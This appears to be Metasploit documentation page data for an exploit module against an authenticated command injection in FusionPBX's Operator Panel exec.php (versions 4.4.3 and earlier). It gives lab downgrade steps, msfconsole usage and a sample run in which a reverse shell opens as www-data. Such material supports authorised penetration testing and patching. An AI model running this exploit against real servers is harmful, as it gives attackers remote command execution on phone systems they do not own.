{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/webapp/fusionpbx_operator_panel_exec_cmd_exec","result":{"data":{"moduleMetadataJson":{"id":"4c07ed8b-bb71-5f8b-98b2-0d5caf9de40b","name":"FusionPBX Operator Panel exec.php Command Execution","fullname":"exploit/unix/webapp/fusionpbx_operator_panel_exec_cmd_exec","description":"This module exploits an authenticated command injection vulnerability\n        in FusionPBX versions 4.4.3 and prior.\n\n        The `exec.php` file within the Operator Panel permits users with\n        `operator_panel_view` permissions, or administrator permissions,\n        to execute arbitrary commands as the web server user by sending\n        a `system` command to the FreeSWITCH event socket interface.\n\n        This module has been tested successfully on FusionPBX version\n        4.4.1 on Ubuntu 19.04 (x64).","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/unix/webapp/fusionpbx_operator_panel_exec_cmd_exec","documentationSlug":"/modules/documentation/exploit/unix/webapp/fusionpbx_operator_panel_exec_cmd_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module exploits an authenticated command injection vulnerability\nin FusionPBX versions 4.4.3 and prior.</p>\n<p>  The <code class=\"language-text\">exec.php</code> file within the Operator Panel permits users with\n<code class=\"language-text\">operator_panel_view</code> permissions, or administrator permissions,\nto execute arbitrary commands as the web server user by sending\na <code class=\"language-text\">system</code> command to the FreeSWITCH event socket interface.</p>\n<h2 id=\"vulnerable-software\" style=\"position:relative;\"><a href=\"#vulnerable-software\" aria-label=\"vulnerable software permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Software</h2>\n<p>  This module has been tested successfully on FusionPBX version\n4.4.1 on Ubuntu 19.04 (x64).</p>\n<p>  Software:</p>\n<ul>\n<li><a href=\"https://www.fusionpbx.com/download\">https://www.fusionpbx.com/download</a></li>\n<li><a href=\"https://github.com/fusionpbx/fusionpbx/releases\">https://github.com/fusionpbx/fusionpbx/releases</a></li>\n</ul>\n<p>  At time of writing, a vulnerable version can be tested by using\nthe relevant install script for the target platform from the download\nlink above, which automatically installs all required dependencies,\nincluding FreeSWITCH and the latest version of FusionPBX.</p>\n<p>  The version of FusionPBX can then be downgraded to a vulnerable version\nby replacing the web root directory with the contents of a vulnerable\nversion, such as version 4.4.1, from the GitHub releases link above.</p>\n<p>  On Ubuntu, downgrading can be performed as follows:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">mv /var/www/fusionpbx /var/www/fusionpbx-latest\nmkdir ~/hackyhackhack/ &amp;&amp; cd ~/hackyhackhack/\nwget https://github.com/fusionpbx/fusionpbx/archive/4.4.1.zip\nunzip 4.4.1.zip\nmv fusionpbx-4.4.1 /var/www/fusionpbx</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  In the future, downgrading may not be as simple as replacing the web\nroot directory contents.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do: <code class=\"language-text\">use exploit/unix/webapp/fusionpbx_operator_panel_exec_cmd_exec</code></li>\n<li>Do: <code class=\"language-text\">set rhosts &lt;IP&gt;</code></li>\n<li>Do: <code class=\"language-text\">set username &lt;username&gt;</code></li>\n<li>Do: <code class=\"language-text\">set password &lt;password&gt;</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a new session</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>TARGETURI</strong></p>\n<p>  The base path to FusionPBX (default: <code class=\"language-text\">/</code>)</p>\n<p>  <strong>USERNAME</strong></p>\n<p>  The username for FusionPBX</p>\n<p>  <strong>PASSWORD</strong></p>\n<p>  The password for FusionPBX</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/unix/webapp/fusionpbx_operator_panel_exec_cmd_exec \nmsf5 exploit(unix/webapp/fusionpbx_operator_panel_exec_cmd_exec) &gt; set rhosts 172.16.191.214\nrhosts =&gt; 172.16.191.214\nmsf5 exploit(unix/webapp/fusionpbx_operator_panel_exec_cmd_exec) &gt; set username test\nusername =&gt; test\nmsf5 exploit(unix/webapp/fusionpbx_operator_panel_exec_cmd_exec) &gt; set password wBXxcY4LTAsMd46!\npassword =&gt; wBXxcY4LTAsMd46!\nmsf5 exploit(unix/webapp/fusionpbx_operator_panel_exec_cmd_exec) &gt; set lhost 172.16.191.165\nlhost =&gt; 172.16.191.165\nmsf5 exploit(unix/webapp/fusionpbx_operator_panel_exec_cmd_exec) &gt; run\n\n[*] Started reverse TCP double handler on 172.16.191.165:4444 \n[+] Authenticated as user &#39;test&#39;\n[*] Sending payload (295 bytes) ...\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo ULzaVUoa3XPSZANH;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket A\n[*] A: &quot;ULzaVUoa3XPSZANH\\r\\n&quot;\n[*] Matching...\n[*] B is input...\n[*] Command shell session 1 opened (172.16.191.165:4444 -&gt; 172.16.191.214:57626) at 2019-11-01 15:54:42 -0400\n\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\npwd\n/\nuname -a\nLinux ubuntu-19-04-x64 5.0.0-32-generic #34-Ubuntu SMP Wed Oct 2 02:06:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"4c07ed8b-bb71-5f8b-98b2-0d5caf9de40b"}}}